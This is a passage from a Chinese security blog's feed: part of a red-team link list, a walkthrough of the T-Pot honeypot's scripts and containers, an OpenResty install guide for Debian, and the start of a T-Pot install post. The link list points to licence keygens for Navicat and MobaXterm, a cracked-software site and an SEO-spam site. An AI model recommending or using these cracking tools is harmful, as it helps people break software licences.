Wiki 系统，支持 markdown</p></li><li><p><a href="https://etherpad.net/">https://etherpad.net/</a> 在线可编辑记事本</p></li><li><p><a href="https://www.upload.ee/">https://www.upload.ee/</a> 文件共享平台</p></li><li><p><a href="https://github.com/micahflee/onionshare">https://github.com/micahflee/onionshare</a> 利用 onion 洋葱服务器匿名文件共享</p></li><li><p><a href="https://github.com/filebrowser/filebrowser">https://github.com/filebrowser/filebrowser</a> GO,基于 Caddy 框架的网盘</p></li><li><p><a href="https://github.com/nextcloud/server">https://github.com/nextcloud/server</a> php，私有云网盘，owncloud 分支</p></li><li><p><a href="https://github.com/owncloud/core">https://github.com/owncloud/core</a> php，私有云网盘，界面不美观</p></li><li><p><a href="https://github.com/haiwen/seafile">https://github.com/haiwen/seafile</a> C,私有云网盘，速度快，功能少</p></li><li><p><a href="https://github.com/ymfe/yapi">https://github.com/ymfe/yapi</a> API 管理工具</p></li><li><p><a href="https://thyrsi.com/">https://thyrsi.com/</a> 图片上传分享工具</p></li></ul><h2 id="隐私匿名加密"><a href="#隐私匿名加密" class="headerlink" title="隐私匿名加密#"></a><strong>隐私匿名加密</strong>#</h2><ul><li><p><a href="https://www.lshack.cn/118/">https://www.lshack.cn/118/</a> 在线接收验证码/邮箱/粘贴板/文件传输大集合。</p></li><li><p><a href="http://bccto.me/">http://bccto.me</a> 一次性邮箱</p></li><li><p><a href="https://www.guerrillamail.com/">https://www.guerrillamail.com</a> 一次性邮箱</p></li><li><p><a href="http://24mail.chacuo.net/">http://24mail.chacuo.net/</a> 一次性邮箱</p></li><li><p><a href="http://www.yopmail.com/">http://www.yopmail.com</a> 一次性邮箱</p></li><li><p><a href="https://yandex.com/">https://yandex.com/</a> 非手机邮箱</p></li><li><p><a href="https://mail.ru/">https://mail.ru/</a> 非手机邮箱</p></li><li><p><a href="https://mail.protonmail.com/login">https://mail.protonmail.com/login</a> 非手机邮箱</p></li><li><p><a href="https://github.com/walkor/workerman-chat">https://github.com/walkor/workerman-chat</a> php，在线聊天室，可扩展</p></li><li><p><a href="https://github.com/hack-chat">https://github.com/hack-chat</a> <a href="https://hack.chat/?your-channel">https://hack.chat/?your-channel</a> js,在线聊天，问号后面跟你的房间名</p></li><li><p><a href="https://github.com/akaxincom/openzaly">https://github.com/akaxincom/openzaly</a> java,聊天室，Akaxin 为客户端闭源</p></li><li><p><a href="https://github.com/RocketChat/Rocket.Chat">https://github.com/RocketChat/Rocket.Chat</a> js,在线团队聊天服务器，<a href="https://rocket.chat/install">https://rocket.chat/install</a></p></li><li><p><a href="https://telegram.org/">https://telegram.org</a></p></li><li><p><a href="https://www.whatsapp.com/">https://www.whatsapp.com</a></p></li><li><p><a href="https://wire.com/en">https://wire.com/en</a></p></li><li><p><a href="https://signal.org/">https://signal.org</a></p></li><li><p><a href="http://www.batmessenger.com/">http://www.batmessenger.com</a></p></li><li><p><a href="http://sid.co/">http://sid.co</a></p></li></ul><h2 id="在线资源"><a href="#在线资源" class="headerlink" title="在线资源#"></a><strong>在线资源</strong>#</h2><ul><li><p><a href="https://github.com/DoubleLabyrinth/navicat-keygen">https://github.com/DoubleLabyrinth/navicat-keygen</a> navicat 注册机</p></li><li><p><a href="https://github.com/DoubleLabyrinth/MobaXterm-keygen">https://github.com/DoubleLabyrinth/MobaXterm-keygen</a> MobaXterm 注册机</p></li><li><p><a href="http://www.zdfans.com/">http://www.zdfans.com</a> zd423 - 软件分享平台领跑者</p></li><li><p><a href="https://www.flaticon.com/">https://www.flaticon.com</a> 免费图标网站</p></li><li><p><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn</a> 原生镜像</p></li><li><p><a href="https://www.freenom.com/">https://www.freenom.com</a> 注册免费域名，dns 解析</p></li><li><p><a href="https://codebeautify.org/">https://codebeautify.org</a> 在线代码美化</p></li><li><p><a href="http://patorjk.com/">http://patorjk.com</a> Text to ASCII Art Generator</p></li><li><p><a href="https://www.seopojie.com/">https://www.seopojie.com</a> SPAM,SEO</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>资料收集</category>
      
      <category>红队</category>
      
    </categories>
    
    
    <tags>
      
      <tag>red team</tag>
      
      <tag>资料收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>T-pot项目分析</title>
    <link href="/2021/02/05/T-pot%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90/"/>
    <url>/2021/02/05/T-pot%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="T-pot结构分析"><a href="#T-pot结构分析" class="headerlink" title="T-pot结构分析"></a>T-pot结构分析</h1><h2 id="0x01-目录结构"><a href="#0x01-目录结构" class="headerlink" title="0x01 目录结构"></a>0x01 目录结构</h2><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210128155902933.png" alt="image-20210128155902933"></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>存放了一系列bash脚本</p><h4 id="2fa-sh"><a href="#2fa-sh" class="headerlink" title="2fa.sh"></a>2fa.sh</h4><p>用于Cockpit的双因素认证。原文中这样描述</p><blockquote><p>SSH and web access</p><p>By default, the SSH daemon allows access on <strong>tcp/64295</strong> with a user / password combination and prevents credential brute forcing attempts using <code>fail2ban</code>. This also counts for Admin UI (<strong>tcp/64294</strong>) and Web UI (<strong>tcp/64297</strong>) access.</p><p>If you do not have a SSH client at hand and still want to access the machine via command line you can do so by accessing the Admin UI from <code>https://&lt;your.ip&gt;:64294</code>, enter</p><ul><li>user: <strong>[tsec or user]</strong> <em>you chose during one of the post install methods</em></li><li>pass: <strong>[password]</strong> <em>you chose during the installation</em></li></ul><p>You can also add two factor authentication to Cockpit just by running <code>2fa.sh</code> on the command line.</p></blockquote><p>也就是说可以在终端执行2fa.sh开启双因素认证，提高系统访问控制策略。</p><p>下面是双因素认证的说明：</p><blockquote><p>什么是双因素认证???</p><p>　从密码学理论上说,用于身份认证主要有三方面要素:一是需要用户记忆的身份认证内容,例如密码或×××号码等;二是用户拥有认证硬件,例如USB Key,智能卡(以下简称IC 卡),磁卡等;三是用户本身拥有的唯一特征,例如指纹、瞳孔、声音等。单独来看,每个要素独立存在时,都有其脆弱性。而把两种要素结合起来,实现双重要素认证,可以有效提高系统访问控制的安全性,就是双因素认证。</p><p>　　双因素认证是一种适合企业的访问控制策略, 它将访问控制过程中个人身份识别更客观化, 有效地防止来自外部的身份欺诈和来自内部的更隐蔽的网络侵犯。一般的企业都有标识身份的员工IC 卡,可以利用这张卡来实现双因素认证。基于过多增加企业信息化成本的角度出发,以下方案采用的是员工卡IC卡+用户密码来进行安全访问控制。</p><p>参考：<a href="https://blog.51cto.com/victorly/2346430">双因素认证(two-factor authentication)</a></p></blockquote><h4 id="backup-es-folders-sh"><a href="#backup-es-folders-sh" class="headerlink" title="backup_es_folders.sh"></a>backup_es_folders.sh</h4><p>备份所有和Elasticsearch相关的文件</p><p><code>elkall_$(date +%Y%m%d%H%M).tgz</code></p><p><code>elkbase_$(date +%Y%m%d%H%M).tgz</code></p><p>的形式存放在<code>/data/elk/data</code>下</p><h4 id="change-ews-config-sh"><a href="#change-ews-config-sh" class="headerlink" title="change_ews_config.sh"></a>change_ews_config.sh</h4><p>ewsposte用于<strong>收集</strong>来自不同蜜罐（例如Glastopf，Honeytrap，Dionaea，Cowrie，Kippo，eMobility，Conpot，Elasticpot，Mailoney，RDPY，VNClowPot，Heralding，Ciscoasa，Tanner和Clutton）的日志和警报）并将其传输到Peba</p><p>默认情况下，T-pot会把收集到的数据发送到<a href="https://sicherheitstacho.eu/">Sicherheitstacho</a>以对其进行支持。</p><p>此文件用于修改其配置</p><h4 id="clean-sh"><a href="#clean-sh" class="headerlink" title="clean.sh"></a>clean.sh</h4><p>日志数据过多的时候进行清除与文件夹重建，部分文件进行压缩还原操作</p><h4 id="dps-sh"><a href="#dps-sh" class="headerlink" title="dps.sh"></a>dps.sh</h4><p>用于检查各个服务是否工作正常</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210129160510160.png" alt="image-20210129160510160"></p><h4 id="dump-es-sh"><a href="#dump-es-sh" class="headerlink" title="dump_es.sh"></a>dump_es.sh</h4><p>导出es所有数据</p><h4 id="export-kibana-objects-sh"><a href="#export-kibana-objects-sh" class="headerlink" title="export_kibana-objects.sh"></a>export_kibana-objects.sh</h4><p>导出所有Kibana对象，包括索引、仪表盘、可视化模块、搜索、配置等</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210129160413357.png" alt="image-20210129160413357"></p><h4 id="hpfeeds-optin-sh"><a href="#hpfeeds-optin-sh" class="headerlink" title="hpfeeds_optin.sh"></a>hpfeeds_optin.sh</h4><p>hpfeeds是一个轻量级的验证发布-订阅协议，使用这个脚本可以配置ews服务，以便自己的数据发送到第三方。</p><p>hpfeeds协议可参考：</p><p><a href="https://das.scusec.org/2016/02/19/hpfeeds/">蜜罐中常用协议——HPFEEDS协议</a></p><h4 id="hptest-sh"><a href="#hptest-sh" class="headerlink" title="hptest.sh"></a>hptest.sh</h4><p>简单测试T-pot是否正常工作的脚本，基于nmap</p><h4 id="import-kibana-objects-sh"><a href="#import-kibana-objects-sh" class="headerlink" title="import_kibana-objects.sh"></a>import_kibana-objects.sh</h4><p>导入kibana配置脚本</p><h4 id="myip-sh"><a href="#myip-sh" class="headerlink" title="myip.sh"></a>myip.sh</h4><p>获取此主机的外部IP</p><h4 id="mytopips-sh"><a href="#mytopips-sh" class="headerlink" title="mytopips.sh"></a>mytopips.sh</h4><p>测试ES是否正常工作</p><h4 id="restore-es-sh"><a href="#restore-es-sh" class="headerlink" title="restore_es.sh"></a>restore_es.sh</h4><p>恢复ES备份，与上面的change_ews_config.sh配合使用</p><h4 id="rule-sh"><a href="#rule-sh" class="headerlink" title="rule.sh"></a>rule.sh</h4><p>配置iptable防火墙的脚本。如果我们要对T-pot进行修改，必须确保iptable中也得到相应配置</p><h4 id="tped-sh（重要）"><a href="#tped-sh（重要）" class="headerlink" title="tped.sh（重要）"></a>tped.sh（重要）</h4><p>如果你修改了<code>docker-compose</code>文件或者使用了不同类型架构，如在standard与collector之间切换，就可以重新链接<code>tpot.yml</code>，然后运行<code>tped.sh</code>选择相应版本，这个脚本非常方便，我们只需要添加新的或者修改原有的docker-compose.yml文件，就可以定制服务。</p><p>在更新时也需要用到<code>tped.sh</code>，首先运行<code>/opt/tpot/update.sh</code>，然后重启运行<code>tped.sh</code>，选择NextGen安装。</p><h4 id="unlock-es-sh"><a href="#unlock-es-sh" class="headerlink" title="unlock_es.sh"></a>unlock_es.sh</h4><p>硬盘使用达到上限后，ES会锁定索引的读写，进行磁盘清理之后可以使用此脚本进行解锁。</p><h4 id="updateip-sh"><a href="#updateip-sh" class="headerlink" title="updateip.sh"></a>updateip.sh</h4><p>更新获取外部IP</p><h3 id="cloud"><a href="#cloud" class="headerlink" title="cloud"></a>cloud</h3><p>云部署相关资料</p><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><blockquote><h5 id="Standard"><a href="#Standard" class="headerlink" title="Standard"></a>Standard</h5><ul><li>Honeypots: adbhoney, ciscoasa, citrixhoneypot, conpot, cowrie, dicompot, dionaea, elasticpot, heralding, honeysap, honeytrap, mailoney, medpot, rdpy, snare &amp; tanner</li><li>Tools: cockpit, cyberchef, ELK, fatt, elasticsearch head, ewsposter, nginx / heimdall, spiderfoot, p0f &amp; suricata</li></ul></blockquote><h4 id="Honeypots"><a href="#Honeypots" class="headerlink" title="Honeypots"></a>Honeypots</h4><p>**<a href="https://github.com/huuck/ADBHoney">adbhoney</a>**：一种为Android Debug Bridge （ADB）设计的蜜罐，ADB服务可以暴露在5555端口，该蜜罐用于捕获攻击者将恶意软件发送到5555端口的行为。</p><p>**<a href="https://github.com/Cymmetria/ciscoasa_honeypot">ciscoasa</a>**：用于Cisco ASA组件的低交互蜜罐，能够检测CVE-2018-0101，DoS和远程代码执行漏洞</p><p>**<a href="https://github.com/MalwareTech/CitrixHoneypot">citrixhoneypot</a>**：适用于CVE-2019-19781的Honepot，检测并记录CVE-2019-19781扫描和利用尝试。 监听端口443.</p><p>**<a href="http://conpot.org/">conpot</a>**：低交互工控蜜罐，提供一系列通用工业控制协议, 能够模拟复杂的工控基础设施。其监听端口为1025、50100、10001、623、161</p><p>**<a href="https://github.com/cowrie/cowrie">cowrie</a>**：基于kippo更改的中交互ssh蜜罐, 可以对暴力攻击账号密码等记录，并提供伪造的文件系统环境记录黑客操作行为, 并保存通过wget/curl下载的文件以及通过SFTP、SCP上传的文件。</p><p>**<a href="https://github.com/nsmfoo/dicompot">dicompot</a>**：医学数字成像和通信（DICOM）蜜罐，其监听端口为11112</p><p>**<a href="https://github.com/DinoTools/dionaea">dionaea</a>**：dionaea是运行于Linux上的一个应用程序，将程序运行于网络环境下，它开放Internet常见服务的默认端口，当有外来连接时，模拟正常服务给予反馈，同时记录下出入网络数据流。网络数据流经由检测模块检测后按类别进行处理，如果有 shellcode 则进行仿真执行；程序会自动下载 shellcode 中指定或后续攻击命令指定下载的恶意文件。其监听端口很多，包括20-21、42、81、135、445、1433、1723、1883、3306、1883、69、5060udp、5061、27017</p><p><strong><a href="https://gitlab.com/bontchev/elasticpot">elasticpot</a>:</strong> 模拟elastcisearch RCE漏洞的蜜罐，通过伪造函数在/,/search, /nodes的请求上回应脆弱ES实例的JSON格式消息。</p><p>**<a href="https://github.com/johnnykv/heralding">heralding</a>**：收集口令的蜜罐，当前支持：ftp，telnet，ssh，http，https，pop3，pop3s，imap，imaps，smtp，vnc，postgresql和socks5。T-pot里默认监听110、143、993、995、1080、5432、5900</p><p>**<a href="https://github.com/SecureAuthCorp/HoneySAP">honeysap</a>**：honeySAP是针对SAP服务的低交互性研究专用蜜罐</p><p>**<a href="https://github.com/armedpot/honeytrap/">honeytrap</a>**：观察针对TCP或UDP服务的攻击，作为一个守护程序模拟一些知名的服务，并能够分析攻击字符串，执行相应的下载文件指令。</p><p>**<a href="https://github.com/awhitehatter/mailoney">mailoney</a>**：SMTP蜜罐，监听端口25</p><p>**<a href="https://github.com/schmalle/medpot">medpot</a>**：HL7 / FHIR蜜罐，监听端口2575</p><p>**<a href="https://github.com/citronneur/rdpy">rdpy</a>**：Microsoft RDP（远程桌面协议）协议蜜罐，监听3389</p><p>**<a href="http://mushmush.org/">snare</a>**：一种Web应用程序蜜罐</p><p>**<a href="http://mushmush.org/">tanner</a>**：是一个远程数据分析和分类服务，用于评估HTTP请求并由<a href="https://github.com/mushorg/snare"><strong>snare</strong></a>服务响应。</p><p><strong><a href="https://github.com/p0f/p0f">p0f</a></strong> 是一个多功能工具，用于被动式获取 操作系统指纹 以识别远程主机操作系统，并且可以穿透防火墙。</p><p>**<a href="http://suricata-ids.org/">Suricata</a>**：一个网络监控引擎</p><h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h4><p><a href="https://cockpit-project.org/running">Cockpit</a>：一个轻量级的web ui，提供实时操作系统性能监控和web 终端管理</p><p><a href="https://gchq.github.io/CyberChef/">Cyberchef</a>：一个用户加密、编码、压缩和数据分析的web平台</p><p><a href="https://www.elastic.co/videos">ELK stack</a>：可视化展示T-pot收集到的事件</p><p><a href="https://mobz.github.io/elasticsearch-head/">Elasticsearch Head</a>：一个Web前端，用于浏览和与Elastic Search集群进行交互。</p><p><a href="https://github.com/telekom-security/ewsposter">ewsposter</a>：用于<strong>收集</strong>来自不同蜜罐（例如Glastopf，Honeytrap，Dionaea，Cowrie，Kippo，eMobility，Conpot，Elasticpot，Mailoney，RDPY，VNClowPot，Heralding，Ciscoasa，Tanner和Clutton）的日志和警报）并将其传输到Peba</p><p>nginx / heimdall：提供web ui，统一管理ELK与其他tools，需要以https输入账号密码访问，监听端口64297</p><p><a href="https://github.com/smicallef/spiderfoot">Spiderfoot</a>：一个开源智能自动化工具，用于开源威胁情报收集和数据分析</p><blockquote><p><strong>Conpot:</strong> 低交互工控蜜罐，提供一系列通用工业控制协议, 能够模拟复杂的工控基础设施。</p><p><strong>Cowrie:</strong> 基于kippo更改的中交互ssh蜜罐, 可以对暴力攻击账号密码等记录，并提供伪造的文件系统环境记录黑客操作行为, 并保存通过wget/curl下载的文件以及通过SFTP、SCP上传的文件。</p><p><strong>Dionaea:</strong> Dionaea是运行于Linux上的一个应用程序，将程序运行于网络环境下，它开放Internet常见服务的默认端口，当有外来连接时，模拟正常服务给予反馈，同时记录下出入网络数据流。网络数据流经由检测模块检测后按类别进行处理，如果有 shellcode 则进行仿真执行；程序会自动下载 shellcode 中指定或后续攻击命令指定下载的恶意文件。</p><p><strong>Elasticpot:</strong> 模拟elastcisearch RCE漏洞的蜜罐，通过伪造函数在/,/_search, /_nodes的请求上回应脆弱ES实例的JSON格式消息。</p><p><strong>Emobility:</strong> 在T-Pot中使用的高交互蜜罐容器， 旨在收集针对下一代交通基础设施的攻击动机和方法。Emobility蜜网包含一个中央收费系统，几个收费点，模拟用户的事务。一旦攻击者访问中控系统web界面，监控并处理运行收费交易，并与收费点交互。除此之外，在随机时间，黑客可能与正在收取车辆费用的用户进行交互。</p><p><strong>Glastopf:</strong> 低交互型Web应用蜜罐, Glastopf蜜罐它能够模拟成千上万的web漏洞，针对攻击的不同攻击手段来回应攻击者，然后从对目标Web应用程序的攻击过程中收集数据。它的目标是针对自动化漏洞扫描/利用工具，通过对漏洞利用方式进行归类，针对某一类的利用方式返回对应的合理结果，以此实现低交互。</p><p><strong>Honeytrap:</strong> 观察针对TCP或UDP服务的攻击，作为一个守护程序模拟一些知名的服务，并能够分析攻击字符串，执行相应的下载文件指令。</p><p><strong>Conpot:</strong> 低交互工控蜜罐，提供一系列通用工业控制协议, 能够模拟复杂的工控基础设施。</p><p><strong>Cowrie:</strong> 基于kippo更改的中交互ssh蜜罐, 可以对暴力攻击账号密码等记录，并提供伪造的文件系统环境记录黑客操作行为, 并保存通过wget/curl下载的文件以及通过SFTP、SCP上传的文件。</p><p><strong>Dionaea:</strong> Dionaea是运行于Linux上的一个应用程序，将程序运行于网络环境下，它开放Internet常见服务的默认端口，当有外来连接时，模拟正常服务给予反馈，同时记录下出入网络数据流。网络数据流经由检测模块检测后按类别进行处理，如果有 shellcode 则进行仿真执行；程序会自动下载 shellcode 中指定或后续攻击命令指定下载的恶意文件。</p><p><strong>Elasticpot:</strong> 模拟elastcisearch RCE漏洞的蜜罐，通过伪造函数在/,/_search, /_nodes的请求上回应脆弱ES实例的JSON格式消息。</p><p><strong>Emobility:</strong> 在T-Pot中使用的高交互蜜罐容器， 旨在收集针对下一代交通基础设施的攻击动机和方法。Emobility蜜网包含一个中央收费系统，几个收费点，模拟用户的事务。一旦攻击者访问中控系统web界面，监控并处理运行收费交易，并与收费点交互。除此之外，在随机时间，黑客可能与正在收取车辆费用的用户进行交互。</p><p><strong>Glastopf:</strong> 低交互型Web应用蜜罐, Glastopf蜜罐它能够模拟成千上万的web漏洞，针对攻击的不同攻击手段来回应攻击者，然后从对目标Web应用程序的攻击过程中收集数据。它的目标是针对自动化漏洞扫描/利用工具，通过对漏洞利用方式进行归类，针对某一类的利用方式返回对应的合理结果，以此实现低交互。</p><p><strong>Honeytrap:</strong> 观察针对TCP或UDP服务的攻击，作为一个守护程序模拟一些知名的服务，并能够分析攻击字符串，执行相应的下载文件指令。</p></blockquote><h3 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h3><p>etc目录目录结构如下：</p><div class="hljs code-wrapper"><pre><code class="hljs bash">.├── compose├── curator├── logrotate├── objects└── tpot.yml</code></pre></div><p>compose目录存放不同类型的配置文件，与我们安装时的选项相同，分别是：collector、industrial、medical、nextgen、sensor、standard</p><h4 id="Standard-yml"><a href="#Standard-yml" class="headerlink" title="Standard.yml"></a>Standard.yml</h4><h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><h3 id="iso"><a href="#iso" class="headerlink" title="iso"></a>iso</h3><h3 id="install-sh-安装脚本"><a href="#install-sh-安装脚本" class="headerlink" title="install.sh (安装脚本)"></a>install.sh (安装脚本)</h3><p>T-pot安装脚本</p><p>主要分为以下几个部分</p><ul><li>Global vars 设定全局变量</li><li>Functions 环境检查与配置函数</li><li>Pre-Installer 预安装</li><li>Prepare installer environmen 预安装环境</li><li>Installer user interaction phase 交互式安装过程</li><li>Installation phase 安装阶段</li></ul><h4 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h4><ul><li>功能性函数，比较重要的是<ul><li>fuGOT_ROOT 检查root</li><li>fuCHECKPACKAGES 安装apt-fast并检查依赖</li><li>fuCHECKNET 检查远程网址是否可以访问，网址为<ul><li><a href="https://ghcr.io/">https://ghcr.io</a> </li><li><a href="https://github.com/">https://github.com</a> </li><li><a href="https://pypi.python.org/">https://pypi.python.org</a> </li><li><a href="https://debian.org/">https://debian.org</a></li></ul></li><li>fuGET_DEPS 安装T-pot依赖<ul><li>dist-upgrade</li><li>安装依赖库</li><li>卸载有问题的包</li></ul></li><li>fuCHECK_PORTS 检查其他服务，通过端口判断</li></ul></li></ul><h4 id="Pre-Installer"><a href="#Pre-Installer" class="headerlink" title="Pre-Installer"></a>Pre-Installer</h4><ul><li>检查依赖，如果不完整会再次安装<ul><li>调用fuGOT_ROOT 、fuCHECKPACKAGES</li></ul></li></ul><h4 id="Prepare-installer-environmen"><a href="#Prepare-installer-environmen" class="headerlink" title="Prepare installer environmen"></a>Prepare installer environmen</h4><ul><li>检查Debian环境并通过输入的参数选择安装方式，例如参数 –type=user</li><li>检查是否设定了配置文件，由于我们安装时没有指定 –conf参数，所以这里的检查会直接跳过</li><li>打印出一些信息，调用fuCHECK_PORTS检查已有服务</li></ul><h4 id="Installer-user-interaction-phase"><a href="#Installer-user-interaction-phase" class="headerlink" title="Installer user interaction phase"></a>Installer user interaction phase</h4><ul><li>调用fuCHECKNET 检查网络</li><li>如果是iso的安装方式，会自动加载iso配置并配置代理，其他安装方式不会自动处理代理。</li><li>选择安装模式，STANDARD、SENSOR等</li><li>输入用户名密码</li></ul><h4 id="Installation-phase"><a href="#Installation-phase" class="headerlink" title="Installation phase"></a>Installation phase</h4><ul><li>调用fuGET_DEPS 安装依赖</li><li>对于sensor模式的安装，安装脚本不会自动写入web凭证</li><li>配置网络</li><li>安装elasticdump、elasticsearch-curator</li><li>如果不是iso方式安装，会从github上重新下载tpotce到/opt/tpot</li><li>修改sshd服务端口、重写/opt/hosts配置</li><li>根据交互安装时的选择，将不同的docker-compose文件链接到tpot目录下</li><li>下载docker镜像</li><li>进行定时任务配置</li><li>建立日志文件夹:/data/***</li><li>修改文件夹权限、与ews社区服务建立联系等</li></ul><h3 id="update-sh"><a href="#update-sh" class="headerlink" title="update.sh"></a>update.sh</h3><h2 id="0x02-T-pot架构"><a href="#0x02-T-pot架构" class="headerlink" title="0x02 T-pot架构"></a>0x02 T-pot架构</h2><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/v2-bfd14215d9efcd3b8cac28eb8850cba9_r.jpg" alt="preview"></p>]]></content>
    
    
    <categories>
      
      <category>蜜罐</category>
      
      <category>T-pot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>T-pot</tag>
      
      <tag>蜜罐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【转载】Openresty Debian部署</title>
    <link href="/2021/02/01/Openresty-Debian%E9%83%A8%E7%BD%B2%E3%80%90%E8%AF%91%E6%96%87%E3%80%91/"/>
    <url>/2021/02/01/Openresty-Debian%E9%83%A8%E7%BD%B2%E3%80%90%E8%AF%91%E6%96%87%E3%80%91/</url>
    
    <content type="html"><![CDATA[<h1 id="【转载】Openresty-Debian部署"><a href="#【转载】Openresty-Debian部署" class="headerlink" title="【转载】Openresty Debian部署"></a>【转载】Openresty Debian部署</h1><p>原文地址：<a href="https://www.installing.in/how-to-install-openresty-on-debian-10/">How to Install Openresty on Debian 10</a></p><p>Openresty是基于Nginx构建的Web服务器，具有一些其他内置功能，例如Lua编程语言。如果要将Lua与Nginx一起使用，则需要从具有Lua支持但带有openresty的源代码编译Nginx，可以获得Nginx的所有功能以及其他一些功能，而无需经历从源代码进行编译的麻烦。</p><p>要在Debian 10上安装Openresty，请遵循以下简单步骤</p><h2 id="步骤1-：（可选）停止Nginx"><a href="#步骤1-：（可选）停止Nginx" class="headerlink" title="步骤1 ：（可选）停止Nginx"></a><strong>步骤1 ：（可选）停止Nginx</strong></h2><p>仅当您已经在系统上运行Nginx时才需要执行此步骤。如果不停止Nginx，openresty的安装可能会失败。</p><p>运行这些命令以停止和禁用Nginx</p><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">disable</span> nginxsudo systemctl stop nginx</code></pre></div><h2 id="步骤2：导入GPG密钥"><a href="#步骤2：导入GPG密钥" class="headerlink" title="步骤2：导入GPG密钥"></a><strong>步骤2：导入GPG密钥</strong></h2><p>运行以下命令以导入GPG密钥</p><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get -y install --no-install-recommends wget gnupg ca-certificates</code></pre></div><p>上面的命令将安装一些依赖项以导入密钥</p><div class="hljs code-wrapper"><pre><code class="hljs bash">wget -O - https://openresty.org/package/pubkey.gpg | sudo apt-key add -</code></pre></div><p>此命令会将GPG密钥导入您的系统</p><h2 id="步骤3：添加Openresty存储库"><a href="#步骤3：添加Openresty存储库" class="headerlink" title="步骤3：添加Openresty存储库"></a><strong>步骤3：添加Openresty存储库</strong></h2><p>首先，获取系统的Debian OS版本。该命令将获取版本代号，并将其保存到变量“代号”。我们将在下一个命令中使用此变量来为您的系统添加适当的存储库。</p><div class="hljs code-wrapper"><pre><code class="hljs bash">codename=`grep -Po <span class="hljs-string">&#x27;VERSION=&quot;[0-9]+ \(\K[^)]+&#x27;</span> /etc/os-release`</code></pre></div><p>现在为您的版本添加openresty存储库</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://openresty.org/package/debian <span class="hljs-variable">$codename</span> openresty&quot;</span> \ | sudo tee /etc/apt/sources.list.d/openresty.list</code></pre></div><h2 id="步骤4：更新apt索引"><a href="#步骤4：更新apt索引" class="headerlink" title="步骤4：更新apt索引"></a><strong>步骤4：更新apt索引</strong></h2><p>使用此命令更新apt索引，以便我们可以从资源库下载最新的软件包</p><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get update</code></pre></div><h2 id="步骤5：安装Openresty"><a href="#步骤5：安装Openresty" class="headerlink" title="步骤5：安装Openresty"></a><strong>步骤5：安装Openresty</strong></h2><p>现在，使用此命令从资源库下载并安装Openresty软件包</p><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get -y install openresty</code></pre></div><p>如果一切顺利，您将在系统上安装openresty。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.installing.in/how-to-install-openresty-on-debian-10/">How to Install Openresty on Debian 10</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
      <category>openresty</category>
      
    </categories>
    
    
    <tags>
      
      <tag>openresty</tag>
      
      <tag>debian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>T-Pot 20.06.1本地安装与代理使用问题</title>
    <link href="/2021/01/23/T-Pot-20-06-1%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BB%A3%E7%90%86%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2021/01/23/T-Pot-20-06-1%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BB%A3%E7%90%86%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="T-Pot-本地安装与代理使用问题"><a href="#T-Pot-本地安装与代理使用问题" class="headerlink" title="T-Pot 本地安装与代理使用问题"></a>T-Pot 本地安装与代理使用问题</h1><p>第一次使用T-pot，由于笔者没有6G内存的vps，所以只能在虚拟机里尝试安装。国内网络无法流畅的访问国外源，代理是必要的。本文解决的问题是T-pot安装过程中docker 下载过慢的问题。希望对像我一样的初次使用者有所帮助。</p><h2 id="T-pot简介"><a href="#T-pot简介" class="headerlink" title="T-pot简介"></a>T-pot简介</h2><p>T-Pot是一个多蜜罐框架，该框架部署了一系列Docker容器，可模拟常见的可利用服务。T-Pot从每个容器收集所有日志，然后集中到ELK中，从而方便管理员查看针对每种服务的攻击行为。</p><h2 id="T-pot安装"><a href="#T-pot安装" class="headerlink" title="T-pot安装"></a>T-pot安装</h2><p>T-pot有2种安装方式：</p><ol><li>使用预先建立的ISO映像：可以使用官方提供的<a href="https://github.com/telekom-security/tpotce/releases">iso</a>也可以自行修改后<a href="https://github.com/telekom-security/tpotce#create-your-own-iso-image">编译</a>，得到iso后可以在vmware中安装。</li><li>云部署：云服务无法选择自己编译的iso，这时候可以指定在云上部署debian10，然后下载源码运行install.sh安装</li></ol><p>我在本地虚拟机上使用第二种安装方式：</p><p>首先需要准备一个debian镜像，可以到此处下载</p><p>Debian镜像（清华大学）下载源：<a href="https://mirrors.tuna.tsinghua.edu.cn/debian-cd/10.7.0-live/amd64/iso-hybrid/debian-live-10.7.0-amd64-standard.iso">debian-live-10.7.0-amd64-standard.iso</a></p><p>我使用的是  debian-live-10.7.0-amd64-standard.iso</p><p>具体的debian安装可以参考<a href="https://zhuanlan.zhihu.com/p/73122221">图解 Debian 